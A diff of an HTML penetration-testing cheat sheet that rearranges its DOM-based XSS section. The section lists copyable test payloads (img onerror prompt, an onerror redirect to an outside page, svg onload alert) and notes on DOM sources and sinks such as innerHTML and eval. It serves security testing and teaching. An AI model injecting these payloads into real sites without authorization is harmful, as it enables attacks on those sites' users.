@@ -90,11 +90,21 @@ to exploit any user that loads the vulnerable page.
 </details>
 <details>
 <summary>DOM TECHNIQUES</summary>
-<p>DESCRIPTION: </p>
+<details>
+<summary>NORMAL TESTS</summary>
 
-<b>NOTE: </b>Inspection of the code is needed 100%, right click > inspect. Look for javascript code that behaves with
-input information. HTML sinks will retrieve HTML content that with manual inspection you can discover that, however, JS sinks
-will behave differently, JS debugger is needed. 
+1. <mark id="TDT06">&lt;img src=x onerror="prompt(1)"&gt;</mark>
+2. <mark id="TDT07">&lt;img src=x onerror="window.location.href="https://machetevault.github.io/machete""&gt;</mark>
+3. <mark id="TDT08">&lt;svg onload=alert(1)&gt;</mark>
+
+<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#TDT06')">.C1.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#TDT07')">.C2.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#TDT08')">.C3.</button>
+	
+</details>	
+
+<b>NOTE: </b>
+Inspection of the code is needed 100%, <u>right click > inspect</u>. Look for javascript code that behaves with input information. 
+HTML sinks will retrieve HTML content that with manual inspection you can discover that, however, JS sinks will behave differently, 
+JS debugger is needed. 
 	
 <b><u>HOW TO KNOW IF DOM-BASED VULNERABILITY EXIST ?</u></b>
 
@@ -110,17 +120,7 @@ document.referrer / window.name / history.pushState / history.replaceState / loc
 IndexedDB (mozIndexedDB, webkitIndexedDB, msIndexedDB) / Database</b>
 	
 <b>SINK =</b> Potentially dangerous JavaScript function | [innerHTML / eval()]
-	
-<details>
-<summary>NORMAL TESTS</summary>
 
-1. <mark id="TDT06">&lt;img src=x onerror="prompt(1)"&gt;</mark>
-2. <mark id="TDT07">&lt;img src=x onerror="window.location.href="https://machetevault.github.io/machete""&gt;</mark>
-3. <mark id="TDT08">&lt;svg onload=alert(1)&gt;</mark>
-
-<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#TDT06')">.C1.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#TDT07')">.C2.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#TDT08')">.C3.</button>
-	
-</details>	
 </details>		
 </div>
 </pre>
